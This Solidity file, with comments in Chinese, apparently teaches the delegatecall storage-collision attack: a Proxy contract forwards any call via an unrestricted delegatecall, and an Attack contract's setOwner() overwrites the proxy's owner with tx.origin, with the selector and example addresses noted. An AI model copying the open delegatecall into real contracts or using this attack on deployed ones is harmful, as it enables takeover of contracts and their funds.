pragma solidity ^0.8.11;

contract Proxy {
    address public owner;

    constructor(){
        // owner1 = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        owner = msg.sender;
    }

    // _data: 0x40caae06
    function forward(address callee, bytes memory _data) public {
        // delegatecall 是一种特殊的函数调用，它会在当前合约的上下文中执行代码，
        // 这意味着它使用的是当前合约的存储，而不是被调用合约的存储
        // 执行完下面的语句后，owner1 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
        (bool success, ) = callee.delegatecall(_data);
        require(success, "tx failed");
    }
}

contract Attack {
    address public owner;
    // owner2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
    function setOwner() public {
        owner = tx.origin;
    }
}